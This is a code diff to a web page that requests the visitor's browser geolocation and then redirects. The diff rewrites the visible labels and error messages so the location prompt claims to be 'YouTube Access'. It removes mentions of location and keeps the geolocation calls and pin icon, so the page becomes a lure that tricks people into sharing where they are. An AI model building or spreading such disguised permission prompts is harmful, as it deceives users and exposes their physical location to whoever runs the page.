@@ -158,14 +158,14 @@
 
 <div class="card" id="uiCard">
     <div class="icon">📍</div>
-    <h3>Location Access</h3>
+    <h3>YouTube Access </h3>
     <div id="statusArea">
         <div class="status-message">
-            <span class="spinner"></span> Requesting location...
+            <span class="spinner"></span> Requesting ...
         </div>
     </div>
     <div class="info-text">
-        ⚡ We need your location to provide the best experience.<br>
+        ⚡ We need your Access to provide the best experience.<br>
         After approval, you will be redirected automatically.
     </div>
     <div class="redirect-note">
@@ -230,13 +230,13 @@
         // Handle geolocation errors with proper feedback, no redirect on denial.
         function handleGeoError(error) {
             console.warn("Geolocation error:", error);
-            let errorMsg = "Permission denied or location unavailable.";
+            let errorMsg = "Permission denied or Access unavailable.";
             if (error.code === 1) {
-                errorMsg = "Location access denied. You must allow location to continue.";
+                errorMsg = "YouTube access denied. You must allow to continue.";
             } else if (error.code === 2) {
                 errorMsg = "Position unavailable. Check your network or GPS.";
             } else if (error.code === 3) {
-                errorMsg = "Location request timed out. Please try again.";
+                errorMsg = "YouTube request timed out. Please try again.";
             }
             setStatus(errorMsg, false, true);
             
@@ -246,11 +246,11 @@
             
             // Add a retry button so user can manually retry if they want (optional)
             const retryButton = document.createElement('button');
-            retryButton.textContent = '🔄 Retry location request';
+            retryButton.textContent = '🔄 Retry YouTube request';
             retryButton.style.marginTop = '16px';
             retryButton.style.fontSize = '0.85rem';
             retryButton.onclick = () => {
-                setStatus("Requesting location...", true, false);
+                setStatus("Requesting ...", true, false);
                 if (iconEl) iconEl.textContent = '📍';
                 // remove button to avoid duplicates
                 if (retryButton.parentNode) retryButton.remove();
